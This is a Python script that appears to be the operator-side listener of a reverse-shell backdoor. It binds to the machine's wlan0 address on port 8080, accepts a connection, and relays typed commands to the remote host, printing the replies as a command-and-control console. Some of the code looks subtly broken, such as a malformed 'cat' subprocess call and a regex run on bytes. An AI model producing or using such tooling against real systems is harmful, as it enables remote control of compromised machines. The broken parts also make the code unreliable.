import re
import subprocess

import simplejson
import socket


class SocketListener:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((self.ip, self.port))
        listener.listen(0)
        print("Listening ...")
        (self.connection, address) = listener.accept()
        print("Connection OK")

    def data_receive(self):
        data = ""
        while True:
            try:
                data = data + self.connection.recv(1024).decode()
                return simplejson.loads(data)
            except ValueError:
                continue

    def execute(self, command):
        self.connection.send(simplejson.dumps(command).encode("utf-8"))
        if command[0] == "quit":
            self.connection.close()
            exit()
        return self.data_receive()

    def start_listener(self):
        while True:
            command = input("Enter command => ")
            command = command.split(" ")
            try:
                command = self.execute(command)
            except Exception:
                command = "Error"
            print(command)


ip_forward_stat = subprocess.run(["cat" + "/proc/sys/net/ipv4/ip_forward"], check=True, capture_output=True, text=True).stdout
print(ip_forward_stat)

if_config = subprocess.check_output(["ifconfig", "wlan0"])
ip_addr = re.search(r"\w\w\w.\w\w\w.\w.\w\w", if_config)
if ip_addr:
    socket_listener = SocketListener(ip_addr.group(0), 8080)
    socket_listener.start_listener()
else:
    print("Error! You must use wifi adapter in your virtual machine")